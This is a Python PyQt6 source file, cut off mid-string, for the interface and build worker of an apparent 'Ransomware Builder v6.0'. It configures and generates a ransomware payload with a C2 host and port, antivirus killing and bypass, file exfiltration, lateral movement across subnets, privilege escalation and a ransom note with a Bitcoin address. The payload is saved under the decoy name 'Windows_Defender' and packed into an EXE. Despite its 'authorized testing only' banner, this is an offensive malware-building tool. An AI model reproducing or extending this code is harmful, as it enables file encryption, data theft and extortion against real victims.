# widgets/ransomware_dialog.py

"""
Ransomware Dialog - Complete UI for Ransomware Builder
Fitur: AV Kill, AV Bypass, Multi-Encryption, All Drives Scan
Tombol Build di atas Process Console - FIXED
"""

from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTextEdit, QGroupBox, QFormLayout,
    QMessageBox, QWidget, QTabWidget, QCheckBox,
    QSpinBox, QComboBox, QFileDialog, QApplication,
    QProgressBar, QSplitter, QGridLayout, QScrollArea,
    QFrame, QButtonGroup, QRadioButton
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QColor, QTextCursor, QIcon, QPixmap, QPainter

import os
import subprocess
import threading
import base64
import random
import string
from pathlib import Path


class RansomwareBuildWorker(QThread):
    """Worker thread untuk build ransomware"""
    output = pyqtSignal(str)
    finished = pyqtSignal(bool, str, str)
    progress = pyqtSignal(int)
    key_generated = pyqtSignal(str)

    def __init__(self, options, output_path):
        super().__init__()
        self.options = options
        self.output_path = output_path
        self._stop = False
        self.decrypt_key = ""
        self.script_path = None

    def stop(self):
        self._stop = True

    def run(self):
        try:
            from modules.payload.ransomware_builder import RansomwareBuilder

            self.output.emit("[*] Building ransomware payload v6.0...")
            self.progress.emit(5)

            if not self.options.get("DECRYPT_KEY"):
                self.decrypt_key = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=64
                ))
                self.options["DECRYPT_KEY"] = self.decrypt_key
                self.key_generated.emit(self.decrypt_key)

            self.output.emit("[*] Generating payload with AV Kill + Bypass...")
            self.progress.emit(10)

            builder = RansomwareBuilder()
            
            result = builder.generate_payload(
                lhost=self.options["LHOST"],
                lport=self.options["LPORT"],
                encryption=self.options["ENCRYPTION"],
                extensions=self.options["EXTENSIONS"],
                ransom_note=self.options["RANSOM_NOTE"],
                btc_address=self.options["BTC_ADDRESS"],
                wallpaper=self.options["WALLPAPER"],
                countdown_seconds=self.options.get("COUNTDOWN_SECONDS", 300),
                exfiltrate=self.options.get("EXFILTRATE_FILES", True),
                max_file_size_mb=self.options.get("MAX_FILE_SIZE_MB", 10),
                use_gui=self.options.get("GUI_MODE", True),
                decrypt_key=self.options["DECRYPT_KEY"],
                av_kill=self.options.get("AV_KILL", True),
                av_bypass=self.options.get("AV_BYPASS", True),
                privilege_esc=self.options.get("PRIVILEGE_ESCALATION", True),
                parallel=self.options.get("PARALLEL_ENCRYPTION", True),
                thread_count=self.options.get("THREAD_COUNT", 4),
                target_os=self.options.get("TARGET_OS", "windows"),
                lateral_movement=self.options.get("LATERAL_MOVEMENT", True),
                lolbins=self.options.get("LOLBINS", True),
                spread_methods=self.options.get("SPREAD_METHODS", "all"),
                target_subnets=self.options.get("TARGET_SUBNETS", "192.168.1.0/24,10.0.0.0/24"),
                max_spread_hosts=self.options.get("MAX_SPREAD_HOSTS", 10),
                use_credentials=self.options.get("USE_CREDENTIALS", True),
                dll_sideloading=self.options.get("DLL_SIDELOADING", True),
                byovd=self.options.get("BYOVD", True),
                desktop_icon_change=self.options.get("DESKTOP_ICON_CHANGE", True),
                obfuscation_level=self.options.get("OBFUSCATION_LEVEL", 5),
                process_injection=self.options.get("PROCESS_INJECTION", True),
                amsi_bypass=self.options.get("AMSI_BYPASS", True),
                etw_bypass=self.options.get("ETW_BYPASS", True),
                dll_unhooking=self.options.get("DLL_UNHOOKING", True),
                syscall_direct=self.options.get("SYSCALL_DIRECT", True),
                reflective_pe=self.options.get("REFLECTIVE_PE", True),
                av_defender_disable=self.options.get("AV_DEFENDER_DISABLE", True),
                av_process_kill=self.options.get("AV_PROCESS_KILL", True),
                av_service_disable=self.options.get("AV_SERVICE_DISABLE", True),
                av_registry_tamper=self.options.get("AV_REGISTRY_TAMPER", True),
                av_driver_unload=self.options.get("AV_DRIVER_UNLOAD", True),
                wmi_event_subscribe=self.options.get("WMI_EVENT_SUBSCRIBE", True),
                max_reconnect_attempts=self.options.get("MAX_RECONNECT_ATTEMPTS", 2)
            )

            self.decrypt_key = result.get("decrypt_key", self.decrypt_key)
            self.progress.emit(30)
            
            features = result.get("features", {})
            self.output.emit("[+] Payload generated successfully")
            self.output.emit(f"[+] Decryption Key: {self.decrypt_key}")
            
            if features.get("av_kill"):
                self.output.emit("[+] AV Kill: ENABLED (15+ methods)")
            if features.get("av_bypass"):
                self.output.emit("[+] AV Bypass: ENABLED (12+ methods)")
            if features.get("dll_sideloading"):
                self.output.emit("[+] DLL Side-Loading: ENABLED")
            if features.get("byovd"):
                self.output.emit("[+] BYOVD: ENABLED")
            if features.get("desktop_icon"):
                self.output.emit("[+] Desktop Icon Change: ENABLED")

            output_format = self.options.get("OUTPUT_FORMAT", "python")
            base_filename = self.options.get("FULL_FILENAME", "Windows_Defender")
            target_os = self.options.get("TARGET_OS", "windows")

            py_path = os.path.join(self.output_path, base_filename + ".py")
            try:
                with open(py_path, 'w', encoding='utf-8') as f:
                    f.write(result["python"])
                self.output.emit(f"[+] Python payload saved: {py_path}")
                self.output.emit(f"[+] Size: {os.path.getsize(py_path):,} bytes")
                self.progress.emit(60)
            except Exception as e:
                self.output.emit(f"[!] Failed to save Python: {e}")

            if output_format == "exe":
                self.output.emit("[*] Building EXE with PyInstaller...")
                self.progress.emit(70)
                self.output.emit("[*] This may take a moment...")
                
                icon_path = self.options.get("ICON_PATH", "")
                icon_file = icon_path if icon_path and os.path.exists(icon_path) else None

                exe_path, error = builder.build_exe(
                    result["python"],
                    base_filename,
                    icon_file,
                    output_dir=self.output_path,
                    target_os=target_os
                )

                if exe_path:
                    self.output.emit("[+] EXE built successfully!")
                    self.output.emit(f"[+] Location: {exe_path}")
                    self.output.emit(f"[+] Size: {os.path.getsize(exe_path):,} bytes")
                    self.output.emit(f"[+] Target OS: {target_os}")
                else:
                    self.output.emit(f"[!] EXE build failed: {error}")
                    self.output.emit("[!] Python script available as fallback")

            self.progress.emit(100)
            self.output.emit(f"\n[+] Decryption Key: {self.decrypt_key}")
            self.finished.emit(True, py_path, "Python + EXE" if output_format == "exe" else "Python")

        except Exception as e:
            self.output.emit(f"[!] Error: {str(e)}")
            import traceback
            self.output.emit(f"[!] {traceback.format_exc()}")
            self.finished.emit(False, str(e), "Error")


class RansomwareDialog(QDialog):
    """Dialog untuk Ransomware Builder - Complete with AV Kill & Bypass"""

    def __init__(self, framework=None, parent=None):
        super().__init__(parent)
        self.framework = framework
        self.setWindowTitle("☠ Ransomware Builder v6.0 - AV Kill + Bypass")
        self.setModal(False)
        self.setMinimumSize(1200, 950)

        self.worker = None
        self.output_dir = str(Path.home() / "lazyframework_payloads")
        self.current_key = ""
        self._build_ui()
        self._apply_defaults()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(6)
        layout.setContentsMargins(8, 8, 8, 8)

        # ── Title Bar ──
        title_widget = QWidget()
        title_widget.setFixedHeight(50)
        title_widget.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a0000, stop:0.3 #2a0000, stop:0.7 #1a0a00, stop:1 #1a0000);
                border-radius: 4px;
            }
        """)
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(15, 5, 15, 5)

        title = QLabel("☠ RANSOMWARE BUILDER v6.0")
        title.setStyleSheet("color: #ff0000; font-size: 18pt; font-weight: bold;")
        title_layout.addWidget(title)
        
        title_layout.addStretch()
        
        version = QLabel("⚡ AV Kill (15+) + Bypass (12+) Engine")
        version.setStyleSheet("color: #ffaa00; font-size: 11pt; font-weight: bold;")
        title_layout.addWidget(version)

        self.status_indicator = QLabel("● Ready")
        self.status_indicator.setStyleSheet("color: #50fa7b; font-size: 11pt; font-weight: bold;")
        title_layout.addWidget(self.status_indicator)

        layout.addWidget(title_widget)

        # ── Warning ──
        warning = QLabel("⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️")
        warning.setStyleSheet("""
            color: #ffff00;
            font-size: 12pt;
            font-weight: bold;
            padding: 8px;
            background: #1a0a0a;
            border: 2px solid #ff0000;
            border-radius: 4px;
        """)
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        warning.setFixedHeight(40)
        layout.addWidget(warning)

        # ── Main Split ──
        main_split = QSplitter(Qt.Orientation.Horizontal)
        main_split.setSizes([600, 500])

        left_panel = self._build_config_panel()
        main_split.addWidget(left_panel)

        right_panel = self._build_output_panel()
        main_split.addWidget(right_panel)

        layout.addWidget(main_split)

        # ── Progress Bar ──
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setFixedHeight(22)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #00ff00;
                border-radius: 3px;
                background: #0a0a0a;
                text-align: center;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-weight: bold;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ff0000,
                    stop:0.3 #ff4400,
                    stop:0.5 #ff8800,
                    stop:0.7 #ffcc00,
                    stop:1 #00ff00);
                border-radius: 2px;
                border: 1px solid #00ff00;
            }
        """)
        layout.addWidget(self.progress_bar)

        # ── RIGHT PANEL: Output Section (Build Button HERE - above Process Console) ──
        # We'll move the build button to the output panel

        # ── Bottom Buttons ──
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(8)

        self.build_btn = QPushButton("🚀 BUILD PAYLOAD")
        self.build_btn.setMinimumHeight(50)
        self.build_btn.setMinimumWidth(200)
        self.build_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ff0000, stop:0.5 #cc0000, stop:1 #ff0000);
                color: white;
                font-weight: bold;
                font-size: 14pt;
                padding: 10px 30px;
                border: 2px solid #ff4444;
                border-radius: 8px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ff3333, stop:0.5 #ff0000, stop:1 #ff3333);
                border-color: #ff8888;
            }
            QPushButton:pressed {
                background: #880000;
            }
            QPushButton:disabled {
                background: #333333;
                color: #666666;
                border-color: #444444;
            }
        """)
        self.build_btn.clicked.connect(self._generate)
        btn_layout.addWidget(self.build_btn)

        self.stop_btn = QPushButton("⏹ STOP")
        self.stop_btn.setMinimumHeight(50)
        self.stop_btn.setMinimumWidth(120)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background: #555555;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                padding: 8px 18px;
                border: 2px solid #777777;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #777777;
                border-color: #999999;
            }
            QPushButton:disabled {
                background: #222222;
                color: #444444;
                border-color: #333333;
            }
        """)
        self.stop_btn.clicked.connect(self._stop_generation)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)

        btn_layout.addStretch()

        self.copy_btn = QPushButton("📋 Copy")
        self.copy_btn.setMinimumHeight(40)
        self.copy_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                padding: 6px 16px;
                border: none;
                border-radius: 4px;
                font-size: 11pt;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.copy_btn.clicked.connect(self._copy_output)
        btn_layout.addWidget(self.copy_btn)

        self.save_btn = QPushButton("💾 Save")
        self.save_btn.setMinimumHeight(40)
        self.save_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                padding: 6px 16px;
                border: none;
                border-radius: 4px;
                font-size: 11pt;
            }
            QPushButton:hover { background: #2ea043; }
        """)
        self.save_btn.clicked.connect(self._save_output)
        btn_layout.addWidget(self.save_btn)

        self.open_folder_btn = QPushButton("📂 Open Folder")
        self.open_folder_btn.setMinimumHeight(40)
        self.open_folder_btn.setStyleSheet("""
            QPushButton {
                background: #da3633;
                color: white;
                font-weight: bold;
                padding: 6px 16px;
                border: none;
                border-radius: 4px;
                font-size: 11pt;
            }
            QPushButton:hover { background: #f85149; }
        """)
        self.open_folder_btn.clicked.connect(self._open_output_folder)
        btn_layout.addWidget(self.open_folder_btn)

        layout.addLayout(btn_layout)

    def _build_config_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.Shape.NoFrame)
        scroll.setStyleSheet("""
            QScrollArea {
                border: none;
                background: transparent;
            }
            QScrollBar:vertical {
                background: #1a1a1a;
                width: 10px;
            }
            QScrollBar::handle:vertical {
                background: #444;
                border-radius: 4px;
                min-height: 30px;
            }
            QScrollBar::handle:vertical:hover {
                background: #666;
            }
        """)
        
        scroll_content = QWidget()
        scroll_layout = QVBoxLayout(scroll_content)
        scroll_layout.setSpacing(4)
        scroll_layout.setContentsMargins(4, 4, 4, 4)

        # ── Connection Settings ──
        conn_group = QGroupBox("🌐 Connection Settings")
        conn_group.setStyleSheet(self._group_style("#00ff00"))
        conn_layout = QFormLayout()
        conn_layout.setSpacing(4)
        conn_layout.setContentsMargins(8, 12, 8, 6)

        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("C2 IP Address")
        self.lhost_input.setFixedHeight(30)
        self.lhost_input.setStyleSheet(self._input_style())
        conn_layout.addRow("LHOST:", self.lhost_input)

        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("4444")
        self.lport_input.setText("4444")
        self.lport_input.setFixedHeight(30)
        self.lport_input.setStyleSheet(self._input_style())
        conn_layout.addRow("LPORT:", self.lport_input)

        conn_group.setLayout(conn_layout)
        scroll_layout.addWidget(conn_group)

        # ── Payload Settings ──
        payload_group = QGroupBox("⚡ Payload Settings")
        payload_group.setStyleSheet(self._group_style("#ffaa00"))
        payload_layout = QFormLayout()
        payload_layout.setSpacing(3)
        payload_layout.setContentsMargins(8, 12, 8, 6)

        self.encryption_combo = QComboBox()
        self.encryption_combo.addItems([
            "xchacha20", "aes256", "aes128", "chacha20", 
            "twofish", "serpent", "camellia", "blowfish", 
            "des3", "rc4", "xor"
        ])
        self.encryption_combo.setCurrentText("xchacha20")
        self.encryption_combo.setFixedHeight(30)
        self.encryption_combo.setStyleSheet(self._combo_style())
        payload_layout.addRow("Encryption:", self.encryption_combo)

        self.extensions_input = QLineEdit()
        self.extensions_input.setText("txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv")
        self.extensions_input.setPlaceholderText("Extensions")
        self.extensions_input.setFixedHeight(30)
        self.extensions_input.setStyleSheet(self._input_style())
        payload_layout.addRow("Extensions:", self.extensions_input)

        self.btc_input = QLineEdit()
        self.btc_input.setText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        self.btc_input.setPlaceholderText("BTC Address")
        self.btc_input.setFixedHeight(30)
        self.btc_input.setStyleSheet(self._input_style())
        payload_layout.addRow("BTC Address:", self.btc_input)

        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 32)
        self.thread_spin.setValue(8)
        self.thread_spin.setFixedHeight(30)
        self.thread_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Threads:", self.thread_spin)

        self.max_size_spin = QSpinBox()
        self.max_size_spin.setRange(1, 100)
        self.max_size_spin.setValue(10)
        self.max_size_spin.setSuffix(" MB")
        self.max_size_spin.setFixedHeight(30)
        self.max_size_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Max File Size:", self.max_size_spin)

        self.countdown_spin = QSpinBox()
        self.countdown_spin.setRange(10, 3600)
        self.countdown_spin.setValue(300)
        self.countdown_spin.setSuffix(" s")
        self.countdown_spin.setFixedHeight(30)
        self.countdown_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Countdown:", self.countdown_spin)

        self.decrypt_key_input = QLineEdit()
        self.decrypt_key_input.setPlaceholderText("Auto-generate (64 chars)")
        self.decrypt_key_input.setFixedHeight(30)
        self.decrypt_key_input.setStyleSheet(self._input_style())
        payload_layout.addRow("Decrypt Key:", self.decrypt_key_input)

        payload_group.setLayout(payload_layout)
        scroll_layout.addWidget(payload_group)

        # ── AV Kill Engine ──
        avkill_group = QGroupBox("☠ AV Kill Engine (15+ Methods)")
        avkill_group.setStyleSheet(self._group_style("#ff0000"))
        avkill_layout = QVBoxLayout()
        avkill_layout.setSpacing(4)
        avkill_layout.setContentsMargins(8, 12, 8, 6)

        row_main = QHBoxLayout()
        self.av_kill_cb = QCheckBox("Enable AV Kill Engine")
        self.av_kill_cb.setChecked(True)
        self.av_kill_cb.setStyleSheet("color: #ff4444; font-weight: bold;")
        self.av_kill_cb.toggled.connect(self._toggle_av_kill)
        row_main.addWidget(self.av_kill_cb)
        row_main.addStretch()
        avkill_layout.addLayout(row_main)

        row1 = QHBoxLayout()
        self.av_process_kill_cb = QCheckBox("Kill AV Processes")
        self.av_process_kill_cb.setChecked(True)
        self.av_process_kill_cb.setStyleSheet("color: #cccccc;")
        row1.addWidget(self.av_process_kill_cb)
        self.av_service_disable_cb = QCheckBox("Disable AV Services")
        self.av_service_disable_cb.setChecked(True)
        self.av_service_disable_cb.setStyleSheet("color: #cccccc;")
        row1.addWidget(self.av_service_disable_cb)
        row1.addStretch()
        avkill_layout.addLayout(row1)

        row2 = QHBoxLayout()
        self.av_registry_tamper_cb = QCheckBox("Tamper AV Registry")
        self.av_registry_tamper_cb.setChecked(True)
        self.av_registry_tamper_cb.setStyleSheet("color: #cccccc;")
        row2.addWidget(self.av_registry_tamper_cb)
        self.av_driver_unload_cb = QCheckBox("Unload AV Drivers")
        self.av_driver_unload_cb.setChecked(True)
        self.av_driver_unload_cb.setStyleSheet("color: #cccccc;")
        row2.addWidget(self.av_driver_unload_cb)
        row2.addStretch()
        avkill_layout.addLayout(row2)

        row3 = QHBoxLayout()
        self.av_defender_disable_cb = QCheckBox("Disable Windows Defender")
        self.av_defender_disable_cb.setChecked(True)
        self.av_defender_disable_cb.setStyleSheet("color: #cccccc;")
        row3.addWidget(self.av_defender_disable_cb)
        self.wmi_event_subscribe_cb = QCheckBox("WMI Persistence")
        self.wmi_event_subscribe_cb.setChecked(True)
        self.wmi_event_subscribe_cb.setStyleSheet("color: #cccccc;")
        row3.addWidget(self.wmi_event_subscribe_cb)
        row3.addStretch()
        avkill_layout.addLayout(row3)

        info_label = QLabel("⚡ Methods: Process Kill, Service Disable, Registry Tamper, Driver Unload, Defender Disable, Exclusions, WMI, False Positive")
        info_label.setStyleSheet("color: #666666; font-size: 8pt; padding: 4px;")
        avkill_layout.addWidget(info_label)

        avkill_group.setLayout(avkill_layout)
        scroll_layout.addWidget(avkill_group)

        # ── AV Bypass Engine ──
        avbypass_group = QGroupBox("🛡️ AV Bypass Engine (12+ Methods)")
        avbypass_group.setStyleSheet(self._group_style("#ff00ff"))
        avbypass_layout = QVBoxLayout()
        avbypass_layout.setSpacing(4)
        avbypass_layout.setContentsMargins(8, 12, 8, 6)

        row_main2 = QHBoxLayout()
        self.av_bypass_cb = QCheckBox("Enable AV Bypass Engine")
        self.av_bypass_cb.setChecked(True)
        self.av_bypass_cb.setStyleSheet("color: #ff00ff; font-weight: bold;")
        self.av_bypass_cb.toggled.connect(self._toggle_av_bypass)
        row_main2.addWidget(self.av_bypass_cb)
        row_main2.addStretch()
        avbypass_layout.addLayout(row_main2)

        row4 = QHBoxLayout()
        self.amsi_bypass_cb = QCheckBox("AMSI Bypass (5 techniques)")
        self.amsi_bypass_cb.setChecked(True)
        self.amsi_bypass_cb.setStyleSheet("color: #cccccc;")
        row4.addWidget(self.amsi_bypass_cb)
        self.etw_bypass_cb = QCheckBox("ETW Bypass (3 techniques)")
        self.etw_bypass_cb.setChecked(True)
        self.etw_bypass_cb.setStyleSheet("color: #cccccc;")
        row4.addWidget(self.etw_bypass_cb)
        row4.addStretch()
        avbypass_layout.addLayout(row4)

        row5 = QHBoxLayout()
        self.dll_unhook_cb = QCheckBox("DLL Unhooking")
        self.dll_unhook_cb.setChecked(True)
        self.dll_unhook_cb.setStyleSheet("color: #cccccc;")
        row5.addWidget(self.dll_unhook_cb)
        self.syscall_direct_cb = QCheckBox("Direct Syscalls")
        self.syscall_direct_cb.setChecked(True)
        self.syscall_direct_cb.setStyleSheet("color: #cccccc;")
        row5.addWidget(self.syscall_direct_cb)
        row5.addStretch()
        avbypass_layout.addLayout(row5)

        row6 = QHBoxLayout()
        self.process_injection_cb = QCheckBox("Process Injection")
        self.process_injection_cb.setChecked(True)
        self.process_injection_cb.setStyleSheet("color: #cccccc;")
        row6.addWidget(self.process_injection_cb)
        self.reflective_pe_cb = QCheckBox("Reflective PE Loading")
        self.reflective_pe_cb.setChecked(True)
        self.reflective_pe_cb.setStyleSheet("color: #cccccc;")
        row6.addWidget(self.reflective_pe_cb)
        row6.addStretch()
        avbypass_layout.addLayout(row6)

        row7 = QHBoxLayout()
        row7.addWidget(QLabel("Obfuscation Level:"))
        self.obfuscation_combo = QComboBox()
        for i, label in enumerate(["Off (0)", "Low (1)", "Basic (2)", "Medium (3)", "High (4)", "Maximum (5)"]):
            self.obfuscation_combo.addItem(label)
        self.obfuscation_combo.setCurrentIndex(0)
        self.obfuscation_combo.setFixedHeight(30)
        self.obfuscation_combo.setStyleSheet(self._combo_style())
        row7.addWidget(self.obfuscation_combo)
        row7.addStretch()
        avbypass_layout.addLayout(row7)

        info_label2 = QLabel("⚡ Methods: AMSI(5), ETW(3), DLL Unhook, Syscalls, Process Injection, Reflective PE")
        info_label2.setStyleSheet("color: #666666; font-size: 8pt; padding: 4px;")
        avbypass_layout.addWidget(info_label2)

        avbypass_group.setLayout(avbypass_layout)
        scroll_layout.addWidget(avbypass_group)

        # ── Extra Features ──
        extra_group = QGroupBox("🔧 Extra Features")
        extra_group.setStyleSheet(self._group_style("#00ffff"))
        extra_layout = QVBoxLayout()
        extra_layout.setSpacing(4)
        extra_layout.setContentsMargins(8, 12, 8, 6)

        row8 = QHBoxLayout()
        self.dll_sideloading_cb = QCheckBox("DLL Side-Loading")
        self.dll_sideloading_cb.setChecked(True)
        self.dll_sideloading_cb.setStyleSheet("color: #cccccc;")
        row8.addWidget(self.dll_sideloading_cb)
        self.byovd_cb = QCheckBox("BYOVD (Privilege Escalation)")
        self.byovd_cb.setChecked(True)
        self.byovd_cb.setStyleSheet("color: #cccccc;")
        row8.addWidget(self.byovd_cb)
        row8.addStretch()
        extra_layout.addLayout(row8)

        row9 = QHBoxLayout()
        self.wallpaper_cb = QCheckBox("Change Wallpaper")
        self.wallpaper_cb.setChecked(True)
        self.wallpaper_cb.setStyleSheet("color: #cccccc;")
        row9.addWidget(self.wallpaper_cb)
        self.desktop_icon_cb = QCheckBox("Change Desktop Icon")
        self.desktop_icon_cb.setChecked(True)
        self.desktop_icon_cb.setStyleSheet("color: #cccccc;")
        row9.addWidget(self.desktop_icon_cb)
        row9.addStretch()
        extra_layout.addLayout(row9)

        row10 = QHBoxLayout()
        self.exfiltrate_cb = QCheckBox("Exfiltrate Files")
        self.exfiltrate_cb.setChecked(True)
        self.exfiltrate_cb.setStyleSheet("color: #cccccc;")
        row10.addWidget(self.exfiltrate_cb)
        self.gui_cb = QCheckBox("GUI Mode")
        self.gui_cb.setChecked(True)
        self.gui_cb.setStyleSheet("color: #cccccc;")
        row10.addWidget(self.gui_cb)
        row10.addStretch()
        extra_layout.addLayout(row10)

        row11 = QHBoxLayout()
        self.parallel_cb = QCheckBox("Parallel Encryption")
        self.parallel_cb.setChecked(True)
        self.parallel_cb.setStyleSheet("color: #cccccc;")
        row11.addWidget(self.parallel_cb)
        self.priv_esc_cb = QCheckBox("Privilege Escalation")
        self.priv_esc_cb.setChecked(True)
        self.priv_esc_cb.setStyleSheet("color: #cccccc;")
        row11.addWidget(self.priv_esc_cb)
        row11.addStretch()
        extra_layout.addLayout(row11)

        extra_group.setLayout(extra_layout)
        scroll_layout.addWidget(extra_group)

        # ── Output Settings ──
        output_group = QGroupBox("📦 Output Settings")
        output_group.setStyleSheet(self._group_style("#ffff00"))
        output_layout = QFormLayout()
        output_layout.setSpacing(3)
        output_layout.setContentsMargins(8, 12, 8, 6)

        self.format_combo = QComboBox()
        self.format_combo.addItems(["Python (.py)", "EXE"])
        self.format_combo.setFixedHeight(30)
        self.format_combo.setStyleSheet(self._combo_style())
        self.format_combo.currentTextChanged.connect(self._on_format_changed)
        output_layout.addRow("Format:", self.format_combo)

        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["windows", "linux", "macos"])
        self.target_os_combo.setFixedHeight(30)
        self.target_os_combo.setStyleSheet(self._combo_style())
        self.target_os_combo.currentTextChanged.connect(self._update_exe_status)
        output_layout.addRow("Target OS:", self.target_os_combo)

        path_layout = QHBoxLayout()
        self.output_path_input = QLineEdit()
        self.output_path_input.setText(self.output_dir)
        self.output_path_input.setPlaceholderText("Output directory")
        self.output_path_input.setFixedHeight(30)
        self.output_path_input.setStyleSheet(self._input_style())
        path_layout.addWidget(self.output_path_input, 3)

        self.browse_btn = QPushButton("📂")
        self.browse_btn.setFixedSize(34, 30)
        self.browse_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.browse_btn.clicked.connect(self._browse_output_folder)
        path_layout.addWidget(self.browse_btn)
        output_layout.addRow("Path:", path_layout)

        self.file_name_input = QLineEdit()
        self.file_name_input.setText("Windows_Defender")
        self.file_name_input.setPlaceholderText("File name (without extension)")
        self.file_name_input.setFixedHeight(30)
        self.file_name_input.setStyleSheet(self._input_style())
        self.file_name_input.textChanged.connect(self._update_exe_status)
        output_layout.addRow("Name:", self.file_name_input)

        icon_layout = QHBoxLayout()
        self.icon_path_input = QLineEdit()
        self.icon_path_input.setPlaceholderText("Icon path (optional)")
        self.icon_path_input.setFixedHeight(30)
        self.icon_path_input.setStyleSheet(self._input_style())
        icon_layout.addWidget(self.icon_path_input, 3)

        self.icon_browse_btn = QPushButton("📂")
        self.icon_browse_btn.setFixedSize(34, 30)
        self.icon_browse_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.icon_browse_btn.clicked.connect(self._browse_icon)
        icon_layout.addWidget(self.icon_browse_btn)
        output_layout.addRow("Icon:", icon_layout)

        self.format_status = QLabel("✅ Python - runs with python3")
        self.format_status.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 2px;")
        output_layout.addRow("", self.format_status)

        reconnect_layout = QHBoxLayout()
        reconnect_layout.addWidget(QLabel("Max Reconnect:"))
        self.reconnect_combo = QComboBox()
        for i in [0, 1, 2, 3, 5]:
            self.reconnect_combo.addItem(str(i))
        self.reconnect_combo.setCurrentText("2")
        self.reconnect_combo.setFixedHeight(30)
        self.reconnect_combo.setStyleSheet(self._combo_style())
        reconnect_layout.addWidget(self.reconnect_combo)
        reconnect_layout.addStretch()
        output_layout.addRow("", reconnect_layout)

        output_group.setLayout(output_layout)
        scroll_layout.addWidget(output_group)

        # ── Ransom Note ──
        note_group = QGroupBox("📝 Ransom Note")
        note_group.setStyleSheet(self._group_style("#ff79c6"))
        note_layout = QVBoxLayout()
        note_layout.setSpacing(2)
        note_layout.setContentsMargins(8, 10, 8, 4)

        self.note_input = QTextEdit()
        self.note_input.setPlaceholderText(
            "YOUR FILES ARE ENCRYPTED!\n\n"
            "All your important files have been encrypted with XChaCha20-Poly1305.\n"
            "To decrypt your files, you need to pay the ransom.\n\n"
            "Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n"
            "After payment, contact us at: ransomware@onion.com\n\n"
            "You have 300 seconds to pay before the key is destroyed."
        )
        self.note_input.setMaximumHeight(100)
        self.note_input.setStyleSheet(self._textarea_style())
        note_layout.addWidget(self.note_input)

        note_group.setLayout(note_layout)
        scroll_layout.addWidget(note_group)

        scroll_layout.addStretch()
        scroll.setWidget(scroll_content)
        layout.addWidget(scroll)

        return panel

    def _build_output_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        # ── Process Console ──
        console_label = QLabel("📟 Process Console:")
        console_label.setStyleSheet("font-weight: bold; color: #00ff00; font-size: 11pt;")
        layout.addWidget(console_label)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Consolas", 9))
        self.output_text.setMinimumHeight(150)
        self.output_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
        """)
        layout.addWidget(self.output_text)

        # ── Features Status ──
        features_label = QLabel("⚡ Features Status:")
        features_label.setStyleSheet("font-weight: bold; color: #ffaa00; font-size: 10pt;")
        layout.addWidget(features_label)

        self.features_status = QTextEdit()
        self.features_status.setReadOnly(True)
        self.features_status.setMaximumHeight(60)
        self.features_status.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #00ff00;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 4px;
                font-family: 'Consolas', monospace;
                font-size: 8pt;
            }
        """)
        self.features_status.setText("🟢 Ready - Configure and Build")
        layout.addWidget(self.features_status)

        # ── BUILD BUTTON IS HERE (above Decryption Key, before Generated Payload) ──
        build_section = QWidget()
        build_section.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
